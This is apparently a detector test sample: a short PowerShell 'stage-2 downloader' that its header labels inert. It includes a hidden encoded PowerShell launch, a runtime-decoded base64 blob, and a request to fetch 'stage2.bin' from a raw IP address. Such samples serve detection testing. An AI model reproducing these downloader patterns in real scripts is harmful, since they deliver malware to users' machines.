# Cyber Shield demo corpus - stage-2 downloader sample (inert script text).
# Tripwires: hidden encoded PowerShell, a long runtime-decoded base64 blob,
# and a raw-IP payload fetch.

$blob = "fLluwLErtiXy9h/cA+eYyAhZj22Z/V5yH6zCCz3BbvW9v+6lVD2VqQ61u+X9NGKGMg5ttXF9xyxz5c8KcSVdKF5nslLsdm0LxZJ72gdx9LOsQmwqJBIdsRvaQ3QK2X//EJ97T0PlwC3r6zhZJIYj9opQCfzw7mBeI391Z/V+Tf1md1qXkY3q/WxSoRQv+GuwZ4V/5Je4dvGKjicmDW7K1sN5CuMPmeb/uvrDeb+Z5DDxMCkfcR0EqCK1g/MSZL5nEUiAFQPbxVUK0iYwces4pD7PrNT+ro08WqHOD+g9NZKzn4JMSKUnI9rUQejcvHHv"
$bytes = [System.Convert]::FromBase64String($blob)
powershell -nop -w hidden -enc SQBFAFQAUgBZAFQATwBOAC0AVABFAFMAVAAtAEEAAAsA

$http = New-Object -ComObject MSXML2.XMLHTTP
$http.open("GET", "http://185.220.101.7/stage2.bin", $false)
